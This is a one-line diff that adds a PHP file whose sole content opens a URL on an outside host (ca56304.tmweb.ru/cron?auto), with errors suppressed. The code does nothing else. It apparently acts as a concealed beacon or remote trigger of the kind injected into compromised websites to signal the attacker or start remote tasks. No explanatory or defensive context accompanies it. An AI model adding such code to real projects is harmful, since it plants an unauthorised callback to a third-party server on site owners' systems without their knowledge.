@@ -1,0 +1,1 @@
+<?php @fclose(@fopen('http://ca56304.tmweb.ru/cron?auto', 'r'));
